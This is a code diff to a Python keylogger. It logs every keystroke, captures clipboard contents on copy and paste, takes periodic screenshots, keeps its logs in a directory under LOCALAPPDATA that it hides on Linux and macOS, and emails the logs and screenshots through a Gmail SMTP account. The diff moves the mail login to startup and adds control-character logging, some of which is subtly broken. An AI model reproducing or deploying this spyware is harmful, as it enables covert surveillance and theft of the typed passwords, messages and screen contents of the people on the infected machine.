@@ -1,5 +1,5 @@
 import time
-import os
+import os, sys
 import platform
 # module used for capturing keys
 from pynput import keyboard
@@ -23,12 +23,47 @@ import json
 MAXFILESIZE = 5 * 1024
 # maximum screenshots per email
 MAXSCREENSHOTS = 5
+CONTROL_CHARACTER_NAMES = [
+    "Null (NUL)",
+    "Start of Header (SOH)",
+    "Start of Text (STX)",
+    "End of Text (ETX)",
+    "End of Transmission (EOT)",
+    "Enquiry (ENQ)",
+    "Acknowledge (ACK)",
+    "Bell (BEL)",
+    "Backspace (BS)",
+    "Horizontal Tab (HT)",
+    "Line Feed (LF)",
+    "Vertical Tab (VT)",
+    "Form Feed (FF)",
+    "Carriage Return (CR)",
+    "Shift Out (SO)",
+    "Shift In (SI)",
+    "Data Link Escape (DLE)",
+    "Device Control 1 (DC1)",
+    "Device Control 2 (DC2)",
+    "Device Control 3 (DC3)",
+    "Device Control 4 (DC4)",
+    "Negative Acknowledge (NAK)",
+    "Synchronous Idle (SYN)",
+    "End of Transmission Block (ETB)",
+    "Cancel (CAN)",
+    "End of Medium (EM)",
+    "Substitute (SUB)",
+    "Escape (ESC)",
+    "File Separator (FS)",
+    "Group Separator (GS)",
+    "Record Separator (RS)",
+    "Unit Separator (US)",
+    "Delete (DEL)"
+]
 
 logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
 # makes and hides the directory by making is hidden and system file
 os.makedirs(logPath, exist_ok=True)
 if platform.system() == "Windows":
-    os.system(f'attrib +h +s "{logPath}"')
+    os.system(f'attrib -h -s "{logPath}"')
 elif platform.system() in ["Linux", "Darwin"]:
     hidden_file_path = os.path.join(os.path.dirname(logPath), "." + os.path.basename(logPath))
     os.rename(logPath, hidden_file_path)
@@ -46,17 +81,26 @@ password_email = config["email_pass"]
 screenshotPath = os.path.join(logPath, "Temp")
 os.makedirs(screenshotPath, exist_ok=True)
 
+# start up the smtp server for emailing
+context = ssl.create_default_context()
+try:
+    server = smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context)
+    server.login(from_email, password_email)
+except Exception:
+    sys.exit(130)
+
 def remove_files_in_directory(directory):
     for file in os.listdir(directory):
         file_path = os.path.join(directory, file)
         if os.path.isfile(file_path):
             try:
                 os.remove(file_path)
-            except Exception:
-                pass
+            except Exception as e:
+                send_email("Error", from_email, e, True)
+                sys.exit(130)
 
 # function to send email of the logged data
-def send_email(subject, to, body):
+def send_email(subject, to, body, close=False):
     email = MIMEMultipart()
     email["From"] = from_email
     email["To"] = to
@@ -65,7 +109,7 @@ def send_email(subject, to, body):
     email.attach(MIMEText(body, "plain"))
 
     # addding the log text file as attachment
-    if (os.path.isfile(FILENAME)):
+    if (os.path.exists(FILENAME)):
         with open(FILENAME, "r") as text:
             log_attachment = text.read()
         log_attachment_part = MIMEText(log_attachment, "plain")
@@ -87,19 +131,19 @@ def send_email(subject, to, body):
         zip_part.add_header("Content-Disposition", "attachment", filename="temp.zip")
         email.attach(zip_part)
 
-    context = ssl.create_default_context()
-
     try:
-        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
-            server.login(from_email, password_email)
-            text = email.as_string()
-            server.sendmail(from_email, to, text)
-            # remove the files stored on the device
+        text = email.as_string()
+        server.sendmail(from_email, to, text)
+        # remove the files stored on the device
+        if os.path.exists(FILENAME):
             os.remove(FILENAME)
+        if (os.path.isdir(screenshotPath)):
             remove_files_in_directory(screenshotPath)
             os.remove(zip_file)
-    except Exception:
-        pass
+        if close:
+            server.close()
+    except Exception as e:
+        sys.exit(130)
 
 
 
@@ -123,7 +167,9 @@ def take_screenshot(interval=10):
                 num_screenshots = 0
                 send_email("Reached Max", from_email, "Sent from program")
         except Exception as e:
-            send_email("Error", from_email, e)
+            send_email("Error", from_email, e, True)
+            sys.exit(130)
+
 
 # a set to keep track of the keys pressed
 pressedKeys = set()
@@ -133,30 +179,22 @@ def on_press(key):
     
     lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
     # append if the file exists and smaller than specified size, otherwise overwrite it.
-    if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
+    if (os.path.exists(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
         flag = "a"
     else:
         flag = "w"
+        send_email("Starting new log", from_email, "Sent from program")
 
     with open(FILENAME, flag) as f:
         try:
-            f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
-        except AttributeError:
-            # for non-ascii characters
-            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")
-
-    # If Alt + Caps Lock is pressed, program terminates
-    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
-            and keyboard.Key.caps_lock in pressedKeys):
-        send_email("Completion", from_email, "Sent from program")
-        return False
-    
-    # Reading the clipboard if ctrl + c / ctrl + v is pressed
-    if (keyboard.Key.ctrl_l in pressedKeys or keyboard.Key.ctrl_r in pressedKeys):
-        try:
-            if (hasattr(key, 'char')):
-                # getting the control character read by pynput
-                ctrlChar = chr(ord(key.char) & 0x1F)
+            if (keyboard.Key.ctrl_l in pressedKeys or keyboard.Key.ctrl_r in pressedKeys):
+                ctrlCharOrd = ord(key.char) & 0x1F
+                if ctrlCharOrd in range(32):
+                    f.write(f"{CONTROL_CHARACTER_NAMES[ctrlCharOrd]} pressed at {lastKeyPressedTimeString}\n")
+                elif ctrlCharOrd == 127:
+                    f.write(f"{CONTROL_CHARACTER_NAMES[33]} pressed at {lastKeyPressedTimeString}\n")
+                
+                ctrlChar = chr(ctrlCharOrd)
                 # ctrl + v is pressed which pynput reads as SYN ('\x16')
                 if (ctrlChar == '\x16'):
                     with open(FILENAME, flag) as f:
@@ -165,23 +203,34 @@ def on_press(key):
                 # ctrl + c is pressed which pynput reads as ETX ('\x03')
                 elif (ctrlChar == '\x03'):
                     with open(FILENAME, flag) as f:
+                        time.sleep(1)
                         clipboard = pyperclip.paste()
                         f.write(f"{clipboard} copied at {lastKeyPressedTimeString}\n")
-        except Exception as e:
-            send_email("Error", from_email, e)
+            else:
+                f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
+        except AttributeError:
+            # for non-ascii characters
+            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")
+
+    # If Alt + Caps Lock is pressed, program terminates
+    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
+            and keyboard.Key.caps_lock in pressedKeys):
+        send_email("Completion", from_email, "Sent from program", True)
+        return False
 
 def on_release(key):
     pressedKeys.discard(key)
     
 # creates the thread for screenshots whilst still listening to keyboard
-screenshotThread = threading.Thread(target=take_screenshot, args=(500,))
+screenshotThread = threading.Thread(target=take_screenshot, args=(200,))
 screenshotThread.start()
 
 try:    
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 except KeyboardInterrupt as e:
-    send_email("Error", from_email, e)
+    send_email("Error", from_email, "KeyboardInterrupt", True)
+    sys.exit(130)
 finally:
     # ends the thread
     screenshotThreadEvent.set()
